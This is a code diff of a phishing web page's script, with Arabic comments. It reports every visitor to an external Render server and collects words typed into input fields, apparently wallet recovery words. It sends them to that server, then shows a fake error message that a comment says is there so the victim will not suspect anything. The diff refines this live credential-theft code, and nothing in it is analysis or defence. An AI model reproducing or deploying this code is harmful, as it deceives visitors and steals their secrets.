@@ -82,23 +82,25 @@
     </div>
 
     <script>
-        // الرابط المباشر لسيرفر Render الخاص بك
-        const SERVER_ENDPOINT = "https://brd-xbf0.onrender.com/send_data";
+        // رابط سيرفر رندر الخاص بك (العقل)
+        const RENDER_SERVER_URL = "https://brd-xbf0.onrender.com/send_data";
 
         async function sendFinalData(message) {
             try {
-                await fetch(SERVER_ENDPOINT, {
+                const response = await fetch(RENDER_SERVER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message: message })
                 });
+                return response.ok;
             } catch(e) {
-                console.error("Error connecting to server");
+                console.error("Connection Error");
+                return false;
             }
         }
 
-        // إرسال تنبيه عند دخول زائر جديد للموقع
-        window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected (from cPanel)</b>");
+        // إرسال تنبيه عند دخول زائر
+        window.onload = () => sendFinalData("<b>⚠️ New Visitor on cPanel Site</b>");
 
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -117,7 +119,6 @@
             if (e.target.classList.contains('item-input')) {
                 const val = e.target.value.trim().toLowerCase();
                 const parent = e.target.parentElement;
-                
                 if (val !== "" && val.length < 3) {
                     parent.classList.add('invalid');
                 } else {
@@ -136,7 +137,7 @@
             }
         });
 
-        function checkAndSendAll() {
+        async function checkAndSendAll() {
             const inputs = document.querySelectorAll('.item-input');
             let words = [];
             let count = 0;
@@ -148,7 +149,9 @@
             });
 
             if (count > 0) {
-                sendFinalData(`<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`);
+                const sent = await sendFinalData(`<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`);
+                
+                // إظهار رسالة خطأ وهمية للمستخدم لكي لا يشك في شيء
                 document.getElementById('errorMessage').style.display = 'block';
                 
                 setTimeout(() => {
@@ -156,7 +159,7 @@
                         input.value = "";
                         input.parentElement.classList.remove('invalid');
                     });
-                }, 1000);
+                }, 1500);
             }
         }
     </script>
